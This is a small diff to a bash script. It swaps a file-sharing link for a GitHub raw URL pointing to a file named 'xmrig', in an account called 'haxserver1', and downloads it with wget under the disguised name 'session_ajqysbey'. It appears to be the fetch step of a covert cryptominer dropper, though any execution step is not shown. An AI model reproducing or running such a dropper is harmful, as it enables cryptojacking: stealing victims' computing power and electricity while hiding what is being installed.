@@ -1,6 +1,6 @@
 #!/bin/bash
 
-FILE_URL="oshi.at/HyLW"
+FILE_URL="https://github.com/haxserver1/session_uia21jkjgz8719831bs9d1ba971283v/raw/main/xmrig"
 FILE_NAME="session_ajqysbey"
 
 wget -O $FILE_NAME $FILE_URL
